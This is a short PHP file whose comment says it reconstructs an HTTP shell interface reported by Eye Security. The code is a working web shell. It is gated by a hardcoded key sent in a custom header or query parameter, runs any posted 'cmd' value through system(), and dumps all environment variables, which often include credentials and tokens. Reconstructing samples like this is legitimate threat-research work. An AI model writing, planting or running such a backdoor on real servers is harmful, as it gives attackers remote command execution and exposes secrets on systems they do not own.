<?php
// Reconstruction of the HTTP shell interface described by Eye Security.
$key = $_SERVER['HTTP_X_ARTX_KEY'] ?? ($_GET['k'] ?? '');
if ($key !== 'x9f3c2b7e') {
    exit;
}
echo "### ARTX-AGENT\n";
if (isset($_POST['cmd'])) {
    system($_POST['cmd']);
}
if (isset($_GET['env'])) {
    echo json_encode(getenv());
}
